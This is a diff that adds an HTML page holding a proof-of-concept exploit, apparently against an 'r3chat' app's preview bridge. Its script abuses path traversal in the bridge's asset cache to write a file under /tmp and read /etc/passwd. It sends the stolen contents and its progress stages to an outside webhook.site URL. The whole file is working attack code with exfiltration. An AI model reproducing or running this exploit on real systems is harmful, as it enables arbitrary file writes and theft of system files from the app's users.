@@ -1,0 +1,30 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+const CALLBACK = "https://webhook.site/4a7dfec4-a41d-4177-8233-6489bfa07dbc";
+
+async function log(data) {
+  await fetch(CALLBACK + "?" + new URLSearchParams(data), { mode: "no-cors" });
+}
+
+(async () => {
+  const b = window.previewBridge;
+  if (!b) {
+    await log({ stage: "no-previewBridge", href: location.href });
+    return;
+  }
+
+  await log({ stage: "bridge", caps: JSON.stringify(await b.capabilities()) });
+
+  const key = "../../../../../../tmp/r3chat-poc";
+  await b.assetCache.put(key, "r3chat arbitrary file write\n", "utf8");
+  await log({ stage: "wrote", key });
+
+  try {
+    const passwd = await b.assetCache.get("../../../../../../etc/passwd", "utf8");
+    await log({ stage: "read", sample: passwd.slice(0, 180) });
+  } catch (e) {
+    await log({ stage: "read-fail", err: String(e) });
+  }
+})().catch(e => log({ stage: "error", err: String(e && (e.stack || e)) }));
+</script>
